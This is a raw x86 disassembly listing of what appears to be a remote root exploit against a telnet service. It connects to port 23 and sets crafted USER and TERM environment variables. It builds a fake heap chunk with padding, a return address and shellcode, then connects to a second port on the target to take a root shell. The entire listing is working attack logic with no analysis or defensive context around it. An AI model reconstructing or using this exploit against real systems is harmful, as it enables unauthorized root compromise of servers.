push str.Connecting_to__s..._n
call sym.imp.printf
add esp, 0x10
sub esp, 8
push 0x17
push dword [arg_8h]
call sym.sockami
add esp, 0x10
mov eax, eax
mov dword [fildes], eax
cmp dword [fildes], 0xffffffff
jne 0x8048fcc
sub esp, 8
push str.__unable_to_connect_n
push dword [obj.stderr]
call sym.imp.fprintf
add esp, 0x10
sub esp, 0xc
push 1
call sym.imp.exit
sub esp, 0xc
push str.__connected_n
call sym.imp.printf
add esp, 0x10
sub esp, 0xc
push str.Telnet_protocol_rules..._n
call sym.imp.printf
add esp, 0x10
sub esp, 0xc
push dword [fildes]
call sym.td_init
add esp, 0x10
sub esp, 0xc
push str.__yeah_n
call sym.imp.printf
add esp, 0x10
sub esp, 0xc
push str.Setting_2_env_var..._n
call sym.imp.printf
add esp, 0x10
sub esp, 0xc
push 0x27
push 0xfb
push 0xff
push str._c_c_c
lea eax, [buffer]
push eax
call sym.imp.sprintf
add esp, 0x20
push 0
lea eax, [buffer]
sub esp, 8
push eax
call sym.imp.strlen
add esp, 0xc
mov eax, eax
mov eax, eax
push eax
lea eax, [buffer]
push eax
push dword [fildes]
call sym.imp.send
add esp, 0x10
sub esp, 4
push str.AAAAAAA
push str.USER
push dword [fildes]
call sym.put_env
add esp, 0x10
sub esp, 4
push str.BBBBBBB
push str.TERM
push dword [fildes]
call sym.put_env
add esp, 0x10
sub esp, 0xc
push str.__done_n
call sym.imp.printf
add esp, 0x10
sub esp, 8
push dword [arg_ch]
push dword [fildes]
call sym.__mk_flowa
add esp, 0x10
sub esp, 0xc
push str.Building_fake_chunk_and_shellcode_area..._n
call sym.imp.printf
add esp, 0x10
sub esp, 4
mov edx, dword [obj.sel]
mov eax, edx
shl eax, 1
add eax, edx
lea ebx, [eax*8]
mov ecx, 0x804bbc8
mov edx, dword [obj.sel]
mov eax, edx
shl eax, 1
add eax, edx
shl eax, 3
lea edx, [eax + 0x10]
mov eax, obj.target
mov eax, dword [edx + eax]
add eax, dword [ebx + ecx]
push eax
mov edx, dword [obj.sel]
mov eax, edx
shl eax, 1
add eax, edx
lea edx, [eax*8]
mov eax, 0x804bbc8
push dword [edx + eax]
push dword [fildes]
call sym.__mk_darea
add esp, 0x10
mov edx, dword [obj.sel]
mov eax, edx
shl eax, 1
add eax, edx
lea ebx, [eax*8]
mov ecx, 0x804bbc8
mov edx, dword [obj.sel]
mov eax, edx
shl eax, 1
add eax, edx
shl eax, 3
lea edx, [eax + 0x10]
mov eax, obj.target
mov eax, dword [edx + eax]
add eax, dword [ebx + ecx]
push eax
mov edx, dword [obj.sel]
mov eax, edx
shl eax, 1
add eax, edx
lea edx, [eax*8]
mov eax, 0x804bbc8
push dword [edx + eax]
mov edx, dword [obj.sel]
mov eax, edx
shl eax, 1
add eax, edx
shl eax, 3
lea edx, [eax + 0x10]
mov eax, 0x804bbc4
push dword [edx + eax]
push str.__done__with_padding:__d__location:__p_and_retaddr:__p_n
call sym.imp.printf
add esp, 0x10
sub esp, 0xc
push str.Working_for_you..._n
call sym.imp.printf
add esp, 0x10
sub esp, 0xc
push 0x27
push 0xfb
push 0xff
push str._c_c_c
lea eax, [buffer]
push eax
call sym.imp.sprintf
add esp, 0x20
push 0
lea eax, [buffer]
sub esp, 8
push eax
call sym.imp.strlen
add esp, 0xc
mov eax, eax
mov eax, eax
push eax
lea eax, [buffer]
push eax
push dword [fildes]
call sym.imp.send
add esp, 0x10
sub esp, 0xc
push dword [fildes]
call sym.td_postit
add esp, 0x10
sub esp, 0xc
push str.__dude_n
call sym.imp.printf
add esp, 0x10
sub esp, 0xc
push str.Waiting_for_a_real_root_shell..._n__i0x69_rulez____n
call sym.imp.printf
add esp, 0x10
sub esp, 4
push 0xa000
lea eax, [ebp - 0xa418]
push eax
push dword [fildes]
call sym.imp.read
add esp, 0x10
sub esp, 0xc
push 3
call sym.imp.sleep
add esp, 0x10
sub esp, 0xc
push dword [fildes]
call sym.imp.close
add esp, 0x10
sub esp, 0xc
push 2
call sym.imp.sleep
add esp, 0x10
sub esp, 8
push 0x7700
push dword [arg_8h]
call sym.sockami
add esp, 0x10
mov eax, eax
mov dword [fildes], eax
cmp dword [fildes], 0xffffffff
jne 0x8049294
mov eax, 0xffffffff
jmp 0x80492a2
nop
sub esp, 0xc
push dword [fildes]
call sym.shellami
add esp, 0x10
mov ebx, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x245c
lea eax, [var_18h]
sub eax, 0x2430
lea edi, [ebp - 0x2448]
mov esi, 0x804a9c7
cld
mov ecx, 9
rep movsb byte es:[edi], byte ptr [esi]
mov dword [ebp - 0x2458], 0x8056769
mov dword [ebp - 0x2454], 8
mov eax, dword [arg_ch]
sub eax, 0xc
mov dword [ebp - 0x2450], eax
mov eax, dword [arg_10h]
mov dword [ebp - 0x244c], eax
mov dword [ebp - 0x2468], 0
mov dword [ebp - 0x2464], 0
mov dword [ebp - 0x2460], 0xbfffda69
mov dword [ebp - 0x245c], 0xbfffda69
sub esp, 8
push 0x804a9d0
lea eax, [ebp - 0x242c]
push eax
call sym.imp.strcpy
add esp, 0x10
sub esp, 4
push 0x1000
push 0
lea eax, [ebp - 0x2028]
push eax
call sym.imp.memset
add esp, 0x10
mov dword [var_1ch], 0
nop
mov edx, dword [obj.sel]
mov eax, edx
shl eax, 1
add eax, edx
shl eax, 3
lea ecx, [eax + 0x10]
mov edx, 0x804bbc4
mov eax, dword [var_1ch]
cmp eax, dword [ecx + edx]
jl 0x8049c04
jmp 0x8049c24
lea esi, [esi]
sub esp, 8
lea eax, [ebp - 0x242c]
push eax
lea eax, [ebp - 0x2028]
push eax
call sym.imp.strcat
add esp, 0x10
lea eax, [var_1ch]
inc dword [eax]
jmp 0x8049be0
sub esp, 4
push 0x1000
push 0
lea eax, [ptr]
push eax
call sym.imp.memset
add esp, 0x10
sub esp, 4
lea eax, [ebp - 0x2028]
sub esp, 8
push eax
call sym.imp.strlen
add esp, 0xc
mov eax, eax
mov eax, eax
push eax
lea eax, [ebp - 0x2028]
push eax
lea eax, [ptr]
push eax
call sym.imp.memcpy
add esp, 0x10
sub esp, 4
push 0x10
lea eax, [ebp - 0x2458]
push eax
lea ebx, [ptr]
lea eax, [ebp - 0x2028]
push eax
call sym.imp.strlen
add esp, 4
mov eax, eax
mov eax, eax
lea eax, [eax + ebx]
push eax
call sym.imp.memcpy
add esp, 0x10
sub esp, 4
push 0x10
lea eax, [ebp - 0x2468]
push eax
lea ebx, [ptr]
lea eax, [ebp - 0x2028]
push eax
call sym.imp.strlen
add esp, 4
mov eax, eax
mov eax, eax
lea eax, [eax + ebx]
add eax, 0x10
push eax
call sym.imp.memcpy
add esp, 0x10
sub esp, 8
push 0x804a9d2
lea eax, [ebp - 0x242c]
push eax
call sym.imp.strcpy
add esp, 0x10
sub esp, 4
push 0x400
push 0
lea eax, [ebp - 0x2428]
push eax
call sym.imp.memset
add esp, 0x10
sub esp, 4
lea eax, [ebp - 0x2448]
sub esp, 8
push eax
call sym.imp.strlen
add esp, 0xc
mov eax, eax
mov eax, eax
push eax
lea eax, [ebp - 0x2448]
push eax
lea eax, [ebp - 0x2428]
push eax
call sym.imp.memcpy
add esp, 0x10
mov dword [var_1ch], 0
lea esi, [esi]
cmp dword [var_1ch], 0xff
jle 0x8049d48
jmp 0x8049d68
nop
sub esp, 8
lea eax, [ebp - 0x242c]
push eax
lea eax, [ebp - 0x2428]
push eax
call sym.imp.strcat
add esp, 0x10
lea eax, [var_1ch]
inc dword [eax]
jmp 0x8049d3c
sub esp, 8
push obj.shellcode
lea eax, [ebp - 0x2428]
push eax
call sym.imp.strcat
add esp, 0x10
sub esp, 4
lea eax, [ebp - 0x2428]
sub esp, 8
push eax
call sym.imp.strlen
add esp, 0xc
mov eax, eax
mov eax, eax
push eax
lea eax, [ebp - 0x2428]
push eax
lea ebx, [ptr]
lea eax, [ebp - 0x2028]
push eax
call sym.imp.strlen
add esp, 4
mov eax, eax
mov eax, eax
lea eax, [eax + ebx]
add eax, 0x20
push eax
call sym.imp.memcpy
add esp, 0x10
sub esp, 4
lea eax, [ebp - 0x2028]
sub esp, 8
push eax
call sym.imp.strlen
add esp, 0xc
mov eax, eax
mov ebx, eax
lea eax, [ebp - 0x2428]
sub esp, 8
push eax
call sym.imp.strlen
add esp, 0xc
mov eax, eax
mov eax, eax
lea eax, [eax + ebx]
add eax, 0x20
push eax
lea eax, [ptr]
push eax
push dword [fd]
call sym.imp.write
add esp, 0x10
lea esp, [var_ch]
pop ebx
pop esi
pop edi
pop ebp
ret
jmp dword [reloc.strcat]
jmp dword [reloc.sleep]
push ebp
mov ebp, esp
sub esp, 8
mov dword [ptr], 0
mov dword [var_4h], 0
cmp dword [var_4h], 0x1fff
jle 0x8049e38
jmp 0x8049e54
nop
sub esp, 4
push 1
push dword [ptr]
push dword [fd]
call sym.imp.write
add esp, 0x10
lea eax, [var_4h]
inc dword [eax]
jmp 0x8049e2c
mov esi, esi
leave
ret
jmp dword [reloc.__deregister_frame_info]
jmp dword [reloc.getopt]
jmp dword [reloc.atoi]
jmp dword [reloc.sscanf]
jmp dword [reloc.strncpy]
